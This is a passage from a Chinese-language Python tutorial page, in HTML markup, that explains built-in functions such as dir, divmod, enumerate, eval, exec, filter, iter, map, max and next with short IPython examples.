class="hljs-number">2</span>]))</span><br><span class="line">Out[<span class="hljs-number">94</span>]: &#123;<span class="hljs-string">'a'</span>: <span class="hljs-number">1</span>, <span class="hljs-string">'b'</span>: <span class="hljs-number">2</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">95</span>]: dict([(<span class="hljs-string">'a'</span>,<span class="hljs-number">1</span>),(<span class="hljs-string">'b'</span>,<span class="hljs-number">2</span>)])</span><br><span class="line">Out[<span class="hljs-number">95</span>]: &#123;<span class="hljs-string">'a'</span>: <span class="hljs-number">1</span>, <span class="hljs-string">'b'</span>: <span class="hljs-number">2</span>&#125;</span><br></pre></td></tr></table></figure><p>19 dir()　　</p><p>不带参数时返回当前范围内的变量，方法和定义的类型列表；带参数时返回参数的属性，方法列表。</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">96</span>]: dir(xiaoming)</span><br><span class="line">Out[<span class="hljs-number">96</span>]:</span><br><span class="line">[<span class="hljs-string">'__class__'</span>,</span><br><span class="line"> <span class="hljs-string">'__delattr__'</span>,</span><br><span class="line"> <span class="hljs-string">'__dict__'</span>,</span><br><span class="line"> <span class="hljs-string">'__dir__'</span>,</span><br><span class="line"> <span class="hljs-string">'__doc__'</span>,</span><br><span class="line"> <span class="hljs-string">'__eq__'</span>,</span><br><span class="line"> <span class="hljs-string">'__format__'</span>,</span><br><span class="line"> <span class="hljs-string">'__ge__'</span>,</span><br><span class="line"> <span class="hljs-string">'__getattribute__'</span>,</span><br><span class="line"> <span class="hljs-string">'__gt__'</span>,</span><br><span class="line"> <span class="hljs-string">'__hash__'</span>,</span><br><span class="line"> <span class="hljs-string">'__init__'</span>,</span><br><span class="line"> <span class="hljs-string">'__init_subclass__'</span>,</span><br><span class="line"> <span class="hljs-string">'__le__'</span>,</span><br><span class="line"> <span class="hljs-string">'__lt__'</span>,</span><br><span class="line"> <span class="hljs-string">'__module__'</span>,</span><br><span class="line"> <span class="hljs-string">'__ne__'</span>,</span><br><span class="line"> <span class="hljs-string">'__new__'</span>,</span><br><span class="line"> <span class="hljs-string">'__reduce__'</span>,</span><br><span class="line"> <span class="hljs-string">'__reduce_ex__'</span>,</span><br><span class="line"> <span class="hljs-string">'__repr__'</span>,</span><br><span class="line"> <span class="hljs-string">'__setattr__'</span>,</span><br><span class="line"> <span class="hljs-string">'__sizeof__'</span>,</span><br><span class="line"> <span class="hljs-string">'__str__'</span>,</span><br><span class="line"> <span class="hljs-string">'__subclasshook__'</span>,</span><br><span class="line"> <span class="hljs-string">'__weakref__'</span>,</span><br><span class="line"></span><br><span class="line"> <span class="hljs-string">'name'</span>]</span><br></pre></td></tr></table></figure><p>20 divmod()　　</p><p>分别取商和余数</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">97</span>]: divmod(<span class="hljs-number">10</span>,<span class="hljs-number">3</span>)</span><br><span class="line">Out[<span class="hljs-number">97</span>]: (<span class="hljs-number">3</span>, <span class="hljs-number">1</span>)</span><br></pre></td></tr></table></figure><p>21 enumerate()　　</p><p>返回一个可以枚举的对象，该对象的next()方法将返回一个元组。</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">98</span>]: s = [<span class="hljs-string">"a"</span>,<span class="hljs-string">"b"</span>,<span class="hljs-string">"c"</span>]</span><br><span class="line">    ...: <span class="hljs-keyword">for</span> i ,v <span class="hljs-keyword">in</span> enumerate(s,<span class="hljs-number">1</span>):</span><br><span class="line">    ...:     print(i,v)</span><br><span class="line">    ...:</span><br><span class="line"><span class="hljs-number">1</span> a</span><br><span class="line"><span class="hljs-number">2</span> b</span><br><span class="line"><span class="hljs-number">3</span> c</span><br></pre></td></tr></table></figure><p>22 eval()　<br>　<br>将字符串str 当成有效的表达式来求值并返回计算结果取出字符串中内容</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">99</span>]: s = <span class="hljs-string">"1 + 3 +5"</span></span><br><span class="line">    ...: eval(s)</span><br><span class="line">    ...:</span><br><span class="line">Out[<span class="hljs-number">99</span>]: <span class="hljs-number">9</span></span><br></pre></td></tr></table></figure><p>23 exec()　<br>　<br>执行字符串或complie方法编译过的字符串，没有返回值</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">74</span>]: s  = <span class="hljs-string">"print('helloworld')"</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">75</span>]: r = compile(s,<span class="hljs-string">"&lt;string&gt;"</span>, <span class="hljs-string">"exec"</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">76</span>]: r</span><br><span class="line">Out[<span class="hljs-number">76</span>]: &lt;code object &lt;module&gt; at <span class="hljs-number">0x0000000005DE75D0</span>, file <span class="hljs-string">"&lt;string&gt;"</span>, line <span class="hljs-number">1</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">77</span>]: exec(r)</span><br><span class="line">helloworld</span><br></pre></td></tr></table></figure><p>24 filter()　　</p><p>过滤器，构造一个序列，等价于</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ item <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> iterables <span class="hljs-keyword">if</span> function(item)]</span><br></pre></td></tr></table></figure><p>在函数中设定过滤条件，逐一循环迭代器中的元素，将返回值为True时的元素留下，形成一个filter类型数据。</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">101</span>]: fil = filter(<span class="hljs-keyword">lambda</span> x: x&gt;<span class="hljs-number">10</span>,[<span class="hljs-number">1</span>,<span class="hljs-number">11</span>,<span class="hljs-number">2</span>,<span class="hljs-number">45</span>,<span class="hljs-number">7</span>,<span class="hljs-number">6</span>,<span class="hljs-number">13</span>])</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">102</span>]: list(fil)</span><br><span class="line">Out[<span class="hljs-number">102</span>]: [<span class="hljs-number">11</span>, <span class="hljs-number">45</span>, <span class="hljs-number">13</span>]</span><br></pre></td></tr></table></figure><p>25 float()　　</p><p>将一个字符串或整数转换为浮点数</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">103</span>]: float(<span class="hljs-number">3</span>)</span><br><span class="line">Out[<span class="hljs-number">103</span>]: <span class="hljs-number">3.0</span></span><br></pre></td></tr></table></figure><p>26 format()　　</p><p>格式化输出字符串，format(value, format_spec)实质上是调用了value的format(format_spec)方法。</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">104</span>]: print(<span class="hljs-string">"i am &#123;0&#125;,age&#123;1&#125;"</span>.format(<span class="hljs-string">"tom"</span>,<span class="hljs-number">18</span>))</span><br><span class="line">i am tom,age18</span><br></pre></td></tr></table></figure><p>27 frozenset()　<br>　<br>创建一个不可修改的集合。</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">105</span>]: frozenset([<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>])</span><br><span class="line">Out[<span class="hljs-number">105</span>]: frozenset(&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;)</span><br></pre></td></tr></table></figure><p>28 getattr()　<br>　<br>获取对象的属性</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">106</span>]: getattr(xiaoming,<span class="hljs-string">'name'</span>)</span><br><span class="line">Out[<span class="hljs-number">106</span>]: <span class="hljs-string">'xiaoming'</span></span><br></pre></td></tr></table></figure><p>29 globals()　　</p><p>返回一个描述当前全局变量的字典</p><p>30 hasattr()</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">110</span>]: hasattr(xiaoming,<span class="hljs-string">'name'</span>)</span><br><span class="line">Out[<span class="hljs-number">110</span>]: <span class="hljs-literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">111</span>]: hasattr(xiaoming,<span class="hljs-string">'id'</span>)</span><br><span class="line">Out[<span class="hljs-number">111</span>]: <span class="hljs-literal">False</span></span><br></pre></td></tr></table></figure><p>31 hash()　　</p><p>返回对象的哈希值</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">112</span>]: hash(xiaoming)</span><br><span class="line">Out[<span class="hljs-number">112</span>]: <span class="hljs-number">6139638</span></span><br></pre></td></tr></table></figure><p>32 help()　　</p><p>返回对象的帮助文档</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">113</span>]: help(xiaoming)</span><br><span class="line">Help on Student <span class="hljs-keyword">in</span> module __main__ object:</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span><span class="hljs-params">(builtins.object)</span></span></span><br><span class="line"><span class="hljs-class"> |  <span class="hljs-title">Methods</span> <span class="hljs-title">defined</span> <span class="hljs-title">here</span>:</span></span><br><span class="line"> |</span><br><span class="line"> |  __init__(self, id, name)</span><br><span class="line"> |</span><br><span class="line"> |  __repr__(self)</span><br><span class="line"> |</span><br><span class="line"> |  ----------------------------------------------------------------------</span><br><span class="line"> |  Data descriptors defined here:</span><br><span class="line"> |</span><br><span class="line"> |  __dict__</span><br><span class="line"> |      dictionary <span class="hljs-keyword">for</span> instance variables (<span class="hljs-keyword">if</span> defined)</span><br><span class="line"> |</span><br><span class="line"> |  __weakref__</span><br><span class="line"> |      list of weak references to the object (<span class="hljs-keyword">if</span> defined)</span><br></pre></td></tr></table></figure><p>33 id()　　</p><p>返回对象的内存地址</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">115</span>]: id(xiaoming)</span><br><span class="line">Out[<span class="hljs-number">115</span>]: <span class="hljs-number">98234208</span></span><br></pre></td></tr></table></figure><p>34 input()　<br>　<br>获取用户输入内容</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">116</span>]: input()</span><br><span class="line">aa</span><br><span class="line">Out[<span class="hljs-number">116</span>]: <span class="hljs-string">'aa'</span></span><br></pre></td></tr></table></figure><p>35  int()　<br>　<br>int(x, base =10) , x可能为字符串或数值，将x 转换为一个普通整数。如果参数是字符串，那么它可能包含符号和小数点。如果超出了普通整数的表示范围，一个长整数被返回。</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">120</span>]: int(<span class="hljs-string">'12'</span>,<span class="hljs-number">16</span>)</span><br><span class="line">Out[<span class="hljs-number">120</span>]: <span class="hljs-number">18</span></span><br></pre></td></tr></table></figure><p>36  isinstance(object, classinfo)</p><p>判断object是否为类classinfo的实例，是返回true</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">20</span>]: <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    ...:     ...:     <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self,id,name)</span>:</span></span><br><span class="line">    ...:     ...:         self.id = id</span><br><span class="line">    ...:     ...:         self.name = name</span><br><span class="line">    ...:     ...:     <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__repr__</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">    ...:     ...:         <span class="hljs-keyword">return</span> <span class="hljs-string">'id = '</span>+self.id +<span class="hljs-string">', name = '</span>+self.name</span><br><span class="line">    ...:</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">21</span>]: xiaoming = Student(<span class="hljs-string">'001'</span>,<span class="hljs-string">'xiaoming'</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">22</span>]: isinstance(xiaoming,Student)</span><br><span class="line">Out[<span class="hljs-number">22</span>]: <span class="hljs-literal">True</span></span><br></pre></td></tr></table></figure><p>37 issubclass(class, classinfo)</p><p>如果class是classinfo类的子类，返回True：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">27</span>]: <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">undergraduate</span><span class="hljs-params">(Student)</span>:</span></span><br><span class="line">    ...:     <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">studyClass</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">    ...:         <span class="hljs-keyword">pass</span></span><br><span class="line">    ...:     <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">attendActivity</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">    ...:         <span class="hljs-keyword">pass</span></span><br><span class="line">    ...:</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">28</span>]: issubclass(undergraduate,Student)</span><br><span class="line">Out[<span class="hljs-number">28</span>]: <span class="hljs-literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">29</span>]: issubclass(object,Student)</span><br><span class="line">Out[<span class="hljs-number">29</span>]: <span class="hljs-literal">False</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">30</span>]: issubclass(Student,object)</span><br><span class="line">Out[<span class="hljs-number">30</span>]: <span class="hljs-literal">True</span></span><br><span class="line">如果<span class="hljs-class"><span class="hljs-keyword">class</span>是<span class="hljs-title">classinfo</span>元组中某个元素的子类，也会返回<span class="hljs-title">True</span></span></span><br><span class="line"><span class="hljs-class"><span class="hljs-title">In</span> [26]:</span> issubclass(int,(int,float))</span><br><span class="line">Out[<span class="hljs-number">26</span>]: <span class="hljs-literal">True</span></span><br></pre></td></tr></table></figure><p>38 iter(object, sentinel)</p><p>返回一个可迭代对象, sentinel可省略</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">72</span>]: lst = [<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">73</span>]: <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> iter(lst):</span><br><span class="line">    ...:     print(i)</span><br><span class="line">    ...:</span><br><span class="line"><span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-number">3</span></span><br><span class="line"><span class="hljs-number">5</span></span><br><span class="line">sentinel 理解为迭代对象的哨兵，一旦迭代到此元素，立即终止：</span><br><span class="line">In [<span class="hljs-number">81</span>]: <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestIter</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    ...:         <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">    ...:             self.l=[<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>]</span><br><span class="line">    ...:             self.i=iter(self.l)</span><br><span class="line">    ...:         <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__call__</span><span class="hljs-params">(self)</span>:</span>  <span class="hljs-comment">#定义了__call__方法的类的实例是可调用的</span></span><br><span class="line">    ...:             item = next(self.i)</span><br><span class="line">    ...:             <span class="hljs-keyword">print</span> (<span class="hljs-string">"__call__ is called,which would return"</span>,item)</span><br><span class="line">    ...:             <span class="hljs-keyword">return</span> item</span><br><span class="line">    ...:         <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__iter__</span><span class="hljs-params">(self)</span>:</span> <span class="hljs-comment">#支持迭代协议(即定义有__iter__()函数)</span></span><br><span class="line">    ...:             <span class="hljs-keyword">print</span> (<span class="hljs-string">"__iter__ is called!!"</span>)</span><br><span class="line">    ...:             <span class="hljs-keyword">return</span> iter(self.l)</span><br><span class="line">    ...:</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">82</span>]:     t = TestIter()</span><br><span class="line">    ...:     t1 = iter(t, <span class="hljs-number">3</span>)</span><br><span class="line">    ...:     <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> t1:</span><br><span class="line">    ...:         print(i)</span><br><span class="line">    ...:</span><br><span class="line">__call__ <span class="hljs-keyword">is</span> called,which would <span class="hljs-keyword">return</span> <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-number">1</span></span><br><span class="line">__call__ <span class="hljs-keyword">is</span> called,which would <span class="hljs-keyword">return</span> <span class="hljs-number">3</span></span><br></pre></td></tr></table></figure><p>39 len(s)</p><p>返回对象的长度（元素个数）</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">83</span>]: dic = &#123;<span class="hljs-string">'a'</span>:<span class="hljs-number">1</span>,<span class="hljs-string">'b'</span>:<span class="hljs-number">3</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">84</span>]: len(dic)</span><br><span class="line">Out[<span class="hljs-number">84</span>]: <span class="hljs-number">2</span></span><br></pre></td></tr></table></figure><p>40 list([iterable])</p><p>返回可变序列类型</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">85</span>]: list(map(<span class="hljs-keyword">lambda</span> x: x%<span class="hljs-number">2</span>==<span class="hljs-number">1</span>, [<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>]))</span><br><span class="line">Out[<span class="hljs-number">85</span>]: [<span class="hljs-literal">True</span>, <span class="hljs-literal">True</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">True</span>]</span><br></pre></td></tr></table></figure><p>41 map(function, iterable, …)</p><p>返回一个将 function 应用于 iterable 中每一项并输出其结果的迭代器：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">85</span>]: list(map(<span class="hljs-keyword">lambda</span> x: x%<span class="hljs-number">2</span>==<span class="hljs-number">1</span>, [<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>]))</span><br><span class="line">Out[<span class="hljs-number">85</span>]: [<span class="hljs-literal">True</span>, <span class="hljs-literal">True</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">True</span>]</span><br></pre></td></tr></table></figure><p>可以传入多个iterable对象，输出长度等于最短序列的长度：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">88</span>]: list(map(<span class="hljs-keyword">lambda</span> x,y: x%<span class="hljs-number">2</span>==<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> y%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>, [<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>]))</span><br><span class="line">Out[<span class="hljs-number">88</span>]: [<span class="hljs-literal">False</span>, <span class="hljs-literal">True</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>]</span><br></pre></td></tr></table></figure><p>42 max(iterable,*[, key, default])</p><p>返回最大值：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">99</span>]: max(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)</span><br><span class="line">Out[<span class="hljs-number">99</span>]: <span class="hljs-number">4</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">100</span>]: max((),default=<span class="hljs-number">0</span>)</span><br><span class="line">Out[<span class="hljs-number">100</span>]: <span class="hljs-number">0</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">89</span>]: di = &#123;<span class="hljs-string">'a'</span>:<span class="hljs-number">3</span>,<span class="hljs-string">'b1'</span>:<span class="hljs-number">1</span>,<span class="hljs-string">'c'</span>:<span class="hljs-number">4</span>&#125;</span><br><span class="line">In [<span class="hljs-number">90</span>]: max(di)</span><br><span class="line">Out[<span class="hljs-number">90</span>]: <span class="hljs-string">'c'</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">102</span>]: a = [&#123;<span class="hljs-string">'name'</span>:<span class="hljs-string">'xiaoming'</span>,<span class="hljs-string">'age'</span>:<span class="hljs-number">18</span>,<span class="hljs-string">'gender'</span>:<span class="hljs-string">'male'</span>&#125;,&#123;<span class="hljs-string">'name'</span>:<span class="hljs-string">'</span></span><br><span class="line"><span class="hljs-string">     ...: xiaohong'</span>,<span class="hljs-string">'age'</span>:<span class="hljs-number">20</span>,<span class="hljs-string">'gender'</span>:<span class="hljs-string">'female'</span>&#125;]</span><br><span class="line">In [<span class="hljs-number">104</span>]: max(a,key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-string">'age'</span>])</span><br><span class="line">Out[<span class="hljs-number">104</span>]: &#123;<span class="hljs-string">'name'</span>: <span class="hljs-string">'xiaohong'</span>, <span class="hljs-string">'age'</span>: <span class="hljs-number">20</span>, <span class="hljs-string">'gender'</span>: <span class="hljs-string">'female'</span>&#125;</span><br></pre></td></tr></table></figure><p>43 min(iterable,*[, key, default])</p><p>返回最小值</p><p>44 memoryview(obj)</p><p>返回由给定实参创建的“内存视图”对象， Python 代码访问一个对象的内部数据，只要该对象支持 缓冲区协议 而无需进行拷贝</p><p>45 next(iterator,[, default])</p><p>返回可迭代对象的下一个元素</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">129</span>]: it = iter([<span class="hljs-number">5</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>])</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">130</span>]: next(it)</span><br><span class="line">Out[<span class="hljs-number">130</span>]: <span class="hljs-number">5</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">131</span>]: next(it)</span><br><span class="line">Out[<span class="hljs-number">131</span>]: <span class="hljs-number">3</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">132</span>]: next(it)</span><br><span class="line">Out[<span class="hljs-number">132</span>]: <span class="hljs-number">4</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">133</span>]: next(it)</span><br><span class="line">Out[<span class="hljs-number">133</span>]: <span class="hljs-number">1</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">134</span>]: next(it,<span class="hljs-number">0</span>) <span class="hljs-comment">#迭代到头，默认返回值为0</span></span><br><span class="line">Out[<span class="hljs-number">134</span>]: <span class="hljs-number">0</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">135</span>]: next(it)</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">StopIteration                        Traceback (most recent call last)</span><br><span class="line">&lt;ipython-input<span class="hljs-number">-135</span>-bc1ab118995a&gt; <span class="hljs-keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; 1 next(it)</span><br><span class="line"></span><br><span class="line">StopIteration:</span><br></pre></td></tr></table></figure><p>46 object()</p><p>返回一个没有特征的新对象。object 是所有类的基类。</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">137</span>]: o = object()</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">138</span>]: type(o)</span><br><span class="line">Out[<span class="hljs-number">138</span>]: object</span><br></pre></td></tr></table></figure><p>mode取值表：<br><a href="https://sm.ms/image/7ydUQzZEsRiDYBL" target="_blank"><img src="https://i.loli.net/2019/11/03/7ydUQzZEsRiDYBL.png"></a></p><p>48 pow(base, exp[, mod])</p><p>base为底的exp次幂，如果mod给出，取余</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">149</span>]: pow(<span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>)</span><br><span class="line">Out[<span 